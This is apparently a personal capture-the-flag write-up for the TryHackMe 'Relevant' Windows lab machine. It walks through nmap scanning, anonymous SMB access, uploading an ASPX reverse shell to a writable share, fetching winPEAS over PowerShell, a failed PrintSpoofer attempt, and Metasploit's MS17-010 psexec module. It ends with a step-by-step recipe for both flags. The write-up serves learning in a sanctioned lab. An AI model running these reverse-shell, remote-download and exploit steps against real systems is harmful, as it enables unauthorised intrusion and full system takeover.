### Relevant Room

https://tryhackme.com/room/relevant

well, this machine it's like a real pentest, in description has this


Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)


so,i'll document all that i find here, let's go

$ export ip=10.10.226.137
$ echo $ip

first i did scan the ip with nmap

# sudo nmap -sS -p- 10.10.226.137 -T4 -vv

i use 'sS' flag to do a SYN scan to discover wich ports are open, -p- to scan all ports, -T4 to make the can faster and -vv to verbose output

a few ports are open, 

PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49663/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127

while i'm going to scan more deeper those ports that are open

# sudo nmap -sC -A -p80,135,139,445,3389,49663,49667,49669 10.10.226.137 -T4 -vv

i used a -sC flag to default script's from nmap,-A: Enable OS detection, version detection, script scanning, and traceroute and -T4 and -vv flags that i explained above

and i'll look at the tcp server in my browser.

it's a web page from IIS Windows server with a few welcome messages and if you click in something, you are moved to a microsoft site

i'm going to fuzz the directories in this webserver with gobuster...

$ gobuster dir -u $ip -w /usr/share/wordlists/wordlists/directory_scanner/directory_list_2.3_medium.txt -x js,txt,php

while the scanner run,i'm will take a look in the result from nmap

all those ports are from an microsoft server. hmm

i took a few time analyzing those netbios and smb servers and if is possible exploit them, but i couldn't find anything so...

this question in stackoverflow can help you understand those two services

https://superuser.com/questions/694469/difference-between-netbios-and-smb?ref=hackernoon.com

this blog too

https://hackernoon.com/an-introductory-guide-to-hacking-netbios-bq2w34ay

i got a session service running in netbios service with the nmap scan, i'll try to enumerate this with the flag --script in nmap

# nmap -sV -v --script nbstat.nse $ip

i don't find anything interesint so, i'm going try connect without pass and user

[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

nop, i couldn't 

ok, and the smb server in port 445,it's worth a try!

i've enumerate this port and got this information


		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk

ok,let's try connect in server

$ smbclient //$ip/nt4wrksv -p 445 -U ""

it worked!

ok, i got a passwords.txt file 

$ get passwords.txt
$ cat passwords.txt                                                              
'''                                      
[User Passwords - Encoded]
pass1
pass2
'''

i won't show this here because this room says that writeups are not allowed,so...

first i tried with john but i remember that the passwords.txt contains "Encode" 

then,i used this site to break those two passwords

https://dencode.com

after that i run a scanner in msf6 and...

$ msfconsole
$ use scanner/smb/smb_ms17_010
$ set RHOSTS $ip
$ run 

Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard Evaluation 14393 x64 (64-bit)

ok,let's go exploit this


update:  I lost a big part of what i do after this because of a problem in my OS , but to resume all, i couldn't  made anything yet, i stayed a long time analazying the ports and services etc etc but doesn't found anything.

the one thing that i found is that can access the files in webserver

$ curl http://$ip:49663/nt4wrksv/passwords.txt

i tried to up a php shell but doesn't returns anything for me,so , i don't know ....

when i try to access the payload i receive a 404,but this is just with .php 

OBVIOUS, THE PAGE USES ASP.NET NOT .PHP

ok i can make a rev shell with shell.aspx and it works

;)

i could got the user flag in Users directories,but the administrator is closed,maybe with Bill password? it's worth a try!

runas is closed when i try insert password, i don't know why 

i'll use linpeas to find a way to do a privilege escalation

bro it's hard to find archives when the cmd delays five years to send me a response .......

i don't have curl or wget, i'll use powershell -Invoke-Request to get the linpeas

$ powershell -command "Invoke-WebRequest -UseBasicParsing -Uri http://10.8.146.128:8000/winPEASany.exe -Method GET -OutFile winpeas.exe"

bros took 20 minutes to do this request but it's ok(maybe this scan delays one year to give me results), now i'm going to run linpeas

after ten minutes: anything yet, i'll read while this doesn't finish

ok,finally it finished!

i'm going to put all that winpeas found in scan folder

i tried a the most of these cve's but i couldn't exploit any, some doesn't even compile, but maybe it's my fault so it's ok because i learn a new technical to escalate privilege in windows using tokens

i learned about 'potatoes' too and how they escalated privileges with tokens and some permissions enabled

they potatoes doesn't work anymore but it's possible make it with spoofer and using pipe's too

$ whoami /priv 

i execute this and found some interesting things

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

SeImpersonatePrivilege is enable! 

read this blog:

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

and this:

https://micahvandeusen.com/the-power-of-seimpersonation/

what the spoofer do is capture the system token and impersonate a named pipe with the system token using the ImpersonateNamedPipeClient() function, at the blog he says


'''

Of course, some rules apply to the use of this last function. According to the documentation, here are two of the four cases where impersonation is allowed:

The authenticated identity is same as the caller - In other words, you can impersonate yourself. Surprisingly, there are some exploitation scenarios where this is actually useful.
The caller has the SeImpersonatePrivilege privilege - That’s us! 

'''

hmm, i had receive this error 

'''
c:\inetpub\wwwroot>PrintSpoofer64.exe -i -c cmd PrintSpoofer64.exe -i -c cmd
This version of c:\inetpub\wwwroot\PrintSpoofer64.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher.

'''

then, i needed to find another way to get admin user and i used the ms17_010 that i had said above but couldn't exploit but this time i can make this works

so

now a resume how to beat this room


### User Flag

- connect to smb server
$ export ip= 
$ smbclient \\\\$ip\\nt4wrksv 

- upload shell or any file you want 
link: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

$ put shell.aspx

$ nc -lvnp 1234

$ curl http://$ip:49663/nt4wrksv/shell.aspx -v

$ cd c:\Users\Bob\Desktop

$ type user.txt


### Root Flag

$ msfconsole 

$ use windows/smb/ms17_010_psexec

$ show options

$ set RHOSTS $ip

$ set LHOST $your_ip

$ set SHARE nt4wrksv  # by default the exploit uses 
ADMIN$, you need change this

$ set SMBUser Bob

$ set SMBPAss 'password' 

$ run 

$ cd c:\Users\Administrator\Desktop\

$ cat root.txt # if you use meterpreter :)



